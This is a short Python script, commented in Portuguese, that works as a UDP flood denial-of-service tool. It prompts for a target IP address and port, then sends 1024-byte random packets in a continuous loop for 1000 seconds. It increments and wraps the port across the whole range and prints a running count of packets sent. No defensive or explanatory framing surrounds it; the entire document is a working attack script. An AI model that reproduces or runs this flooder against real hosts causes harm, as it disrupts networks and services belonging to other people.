import sys
import socket
import random
import time


#cria o socket com conexão UDP
socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);
#total de bytes
byte = random._urandom(1024)

total_tempo = 1000
temp = time.time() + total_tempo

ip = str(input("Ip address"))
port = int(input("Port number"))

enviados = 0


while True:
    if time.time() > temp:
        break
    else:
        socket.sendto(byte ,(ip, port))
        enviados += 1
        port += 1
        print(f"Enviando {enviados} pacotes para {ip} na porta {port}")
        if port == 65535:
            port = 1

